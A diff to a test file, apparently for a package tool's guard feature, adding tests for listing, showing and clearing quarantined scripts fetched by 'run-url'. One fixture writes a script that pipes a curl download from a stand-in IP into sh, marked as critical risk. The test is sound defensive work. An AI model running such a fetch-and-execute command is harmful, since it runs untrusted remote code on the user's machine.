@@ -3619,6 +3619,41 @@ test("rehearse uses a package once: PyPI imports it, a crate links into a progra
   assert(not nopy.contains("importlib"), nopy)
 })
 
+test("quarantine lists what run-url kept, reads one again, and clears what is older than quarantine_keep_days (#56)", pack() {
+  if on_windows {
+    snuff
+  }
+  stick dir = fresh("tests/fixtures/empty")
+  stick q = path.join(cigo_home(dir), "quarantine")
+  stick bad = "1111111111111111111111111111111111111111111111111111111111111111"
+  stick old = "2222222222222222222222222222222222222222222222222222222222222222"
+  burn {
+    fs.mkdir(q)
+    fs.write_text(path.join(q, bad + ".sh"), "#!/bin/sh\ncurl -fsSL http://203.0.113.5/x | sh\n")
+    fs.write_text(path.join(q, bad + ".from"), "https://get.example.invalid/install.sh\n")
+    fs.write_text(path.join(q, old + ".sh"), "#!/bin/sh\necho hello\n")
+    proc.run("touch", ["-t", "202001010000", path.join(q, old + ".sh")])
+  }
+  stick listed = guard_tool(dir, ["quarantine"], {})
+  exits(listed, 0)
+  says(listed.out, "111111111111")
+  says(listed.out, "https://get.example.invalid/install.sh")
+  says(listed.out, "(where from was not kept)")
+  stick shown = guard_tool(dir, ["quarantine", "show", "1111"], {})
+  exits(shown, 0)
+  says(shown.out, "read     critical")
+  says(shown.out, "cigo run-url https://get.example.invalid/install.sh")
+  stick j = json.parse(guard_tool(dir, ["quarantine", "show", "2222", "--json"], {}).out)
+  assert(j.risk == "none" and j.from == "", json.stringify(j))
+  exits(guard_tool(dir, ["quarantine", "show", "9"], {}), 2)
+  # Older than 30 days goes; the newer one stays.
+  stick cleared = guard_tool(dir, ["quarantine", "clear"], {})
+  says(cleared.out, "removed 1 from the quarantine")
+  assert(not fs.exists(path.join(q, old + ".sh")) and fs.exists(path.join(q, bad + ".sh")), "the wrong one went")
+  says(guard_tool(dir, ["quarantine", "clear", "--all"], {}).out, "removed 1")
+  assert(not fs.exists(path.join(q, bad + ".sh")) and not fs.exists(path.join(q, bad + ".from")), "--all left something")
+})
+
 # ----- the guard's reach: guard_scope (#57) -------------------------------------------
 #
 # Every guard test has a home of its own (HOME and CIGO_HOME under the test
@@ -3987,6 +4022,8 @@ test("guard: run-url rehearses a script, runs a clean one for real, holds one th
     says(ok.out, "installing for you")
     says(read(dir, "ran.txt"), "ran")
     says(guard_cmd(dir, ["guard", "log"], l).out, "rehearsed, then ran")
+    # The quarantine keeps it, and where it came from.
+    says(guard_cmd(dir, ["quarantine"], l).out, srv.base + "/clean.sh")
     # The same bytes: the kept verdict, no second rehearsal.
     stick again = guard_cmd(dir, ["run-url", srv.base + "/clean.sh"], l)
     exits(again, 0)
